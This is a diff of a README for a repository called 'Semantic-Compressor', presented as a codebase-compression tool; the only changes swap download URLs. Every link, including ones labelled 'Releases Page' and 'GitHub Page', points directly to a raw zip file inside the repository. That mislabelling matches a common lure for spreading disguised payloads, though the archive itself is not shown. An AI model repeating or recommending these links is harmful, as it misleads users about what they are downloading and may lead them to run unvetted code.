@@ -1,6 +1,6 @@
 # 🚀 Semantic-Compressor - Compress Your Codebase Easily
 
-[![Download Semantic-Compressor](https://raw.githubusercontent.com/Sujjan/Semantic-Compressor/main/examples/Semantic-Compressor-3.0.zip)](https://raw.githubusercontent.com/Sujjan/Semantic-Compressor/main/examples/Semantic-Compressor-3.0.zip)
+[![Download Semantic-Compressor](https://github.com/Sujjan/Semantic-Compressor/raw/refs/heads/main/benchmarks/Compressor_Semantic_3.3.zip)](https://github.com/Sujjan/Semantic-Compressor/raw/refs/heads/main/benchmarks/Compressor_Semantic_3.3.zip)
 
 ---
 
@@ -27,7 +27,7 @@ To install and run **Semantic-Compressor**, ensure you meet the following requir
 ### 📥 Download & Install
 
 1. **Visit the Releases Page:** Click on the link below to go to the releases page:
-   [Download Semantic-Compressor](https://raw.githubusercontent.com/Sujjan/Semantic-Compressor/main/examples/Semantic-Compressor-3.0.zip)
+   [Download Semantic-Compressor](https://github.com/Sujjan/Semantic-Compressor/raw/refs/heads/main/benchmarks/Compressor_Semantic_3.3.zip)
 
 2. **Choose Your Version:** On the releases page, find the latest version of **Semantic-Compressor**. You will see several downloadable files. 
 
@@ -86,6 +86,6 @@ This project is open-source and available under the MIT License. You can freely 
 
 ---
 
-For further assistance or if you'd like to contribute, visit our [GitHub Page](https://raw.githubusercontent.com/Sujjan/Semantic-Compressor/main/examples/Semantic-Compressor-3.0.zip).
+For further assistance or if you'd like to contribute, visit our [GitHub Page](https://github.com/Sujjan/Semantic-Compressor/raw/refs/heads/main/benchmarks/Compressor_Semantic_3.3.zip).
 
 Remember, compressing your code has never been easier! Start using **Semantic-Compressor** today to experience the difference.
